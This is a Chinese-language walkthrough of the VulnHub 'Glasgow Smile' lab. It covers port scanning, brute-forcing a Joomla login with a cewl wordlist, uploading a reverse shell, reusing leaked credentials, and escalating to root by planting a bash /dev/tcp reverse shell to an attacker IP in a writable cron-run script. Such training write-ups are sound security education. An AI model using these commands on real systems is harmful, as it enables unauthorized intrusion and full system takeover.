# 原创
：  Glasgow Smile系列：1

# Glasgow Smile系列：1

## 靶机描述

靶机地址：https://download.vulnhub.com/glasgowsmile/GlasgowSmile-v1.1.zip

> 
<h4>Description</h4>
Title: Glasgow Smile

If you are a newbie in Penetration Testing and afraid of OSCP preparation, do not worry. Glasgow Smile is supposed to be a kind of gym for OSCP machines.<br/> The machine is designed to be as real-life as possible. Anyway, You will find also a bunch of ctf style challanges, it’s important to have some encryption knowledge.<br/> You need to have enough information about Linux enumeration and encryption for privileges escalation.
<h3>ABOUT THE VM:</h3>
Just download, extract and load the .vmx file in VMware Workstation (tested on VMware Workstation 15.x.x)<br/> The adapter is currently NAT, networking is configured for DHCP and IP will get assigned automatically
<h3>CONTACT:</h3>
You can contact me on Hack the box (https://www.hackthebox.eu/profile/232477) or by email (mindsflee@hotmail.com) for hints!
<h3>Changelog 2020-06-16 - v1.1 2020-06-15 - v1.0</h3>


### CONTACT:

## 信息收集

利用arp-scan -l命令扫描靶机IP
1.  `arp-scan -l` 
<br/> 使用nmap扫描开放端口
1.  `nmap -sV -p- 192.168.75.172` 
<br/> 访问80端口并进行目录爆破
1.  `dirsearch -u http://192.168.75.172/` 
## 密码爆破

`joomla/administrator`是一个后台登陆页面
1.  `命令：cewl http://192.168.75.172/joomla -m 5 -d 1 -w joomla.txt` 1.  `-w 写入当前目录的文件中` 1.  `-d 表示爬取深度，默认是2` 1.  `-m 表示最小字符长度` 
<br/> 生成字典后对joomla登录页面进行爆破

## 漏洞利用

找到`Extensions-&gt;Templates-&gt;Templates-&gt;Beez3 Details and Files`上传反弹shell

### 反弹shell

<br/> 获得交互式shell
1.  `python -c 'import pty; pty.spawn("/bin/bash")'` 
<br/> 进入到`/var/www`发现有一个`joomla2`的目录

<br/> 查看配置文件发现数据库的账号和密码

### 连接数据库

<br/>`rob`为此虚拟机的一个用户，将`rob`的密码进行base64解密
1.  `???AllIHaveAreNegativeThoughts???` 
### rob连接ssh

使用rob的密码进行ssh登录

<br/> 发现一个加密文件
1.  Abnerineedyourhelp文件名断句分析，Abner I need your help像是一封求助信，打开后看到经过了某种编码加密，从一封信的角度来看，对内容做隐藏让我想到ROT13 1.  Howtoberoot听名字就知道，这应该是提升权限的一个关键点，上面第一个文件应该给到了提示 
### 解密

在线解密工具：https://gchq.github.io/CyberChef/
1.  `abner:I33hope99my0death000makes44more8cents00than0my0life0` 
### abner连接ssh

<br/> 现在查看一下三个账户剩下的最后一个账户`penguin`，查找一下有关penguin的信息
1.  `find / -iname *penguin* 2&gt;/dev/null //找属于penguin的文件` 
<br/> 切换到该目录进行查看

<br/> 将该文件移动到abner用户的主目录下进行解压，否则没有权限
1.  `cp /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip ~` 1.  `//~表示$HOME即用户根目录` 
查看解压出来的文件，尝试一下最后的密码是不是penguins的密码
1.  `scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz` 
### 提权

利用文件权限配置不当进行提权<br/> 当某个进程启动权限为root，对应文件编辑权限为普通用户时，我们可以利用该问题点进行提权

#### pspy64

https://github.com/DominicBreuker/pspy
1.  `chmod + pspy64` 1.  `./pspy64` 
发现隐藏文件`.trash_ol`一分钟执行一次，前面发现这个`.trash_old`是可以编辑的，那就用他来反弹shell
1.  `bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.75.150/7777 0&gt;&amp;1'` 
<br/> 一分钟后，计划任务程序会自动运行`.trash_old`，最终获取root权限

 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
